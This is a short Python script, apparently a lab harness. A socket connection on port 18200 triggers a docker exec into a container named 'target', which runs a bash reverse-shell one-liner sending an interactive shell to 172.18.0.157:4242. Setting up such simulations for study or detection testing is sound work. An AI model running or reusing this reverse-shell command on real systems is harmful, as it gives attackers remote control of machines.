import sys
import time
import docker
import socket
import subprocess

def listen(ip,port,cmd):
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((ip, port))
		s.listen(1)
		
		print("Listening on port {}".format(str(port)))
		conn, addr = s.accept()
		print("Connection received from {}".format(addr))
		
		wrapper_cmd = 'docker exec -it target bash -c "{}"'.format(cmd)
				
		subprocess.run(['gnome-terminal', '-x', 'bash', '-c', wrapper_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
			
		conn.close()

cmd = "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1"

listen("0.0.0.0",18200,cmd)
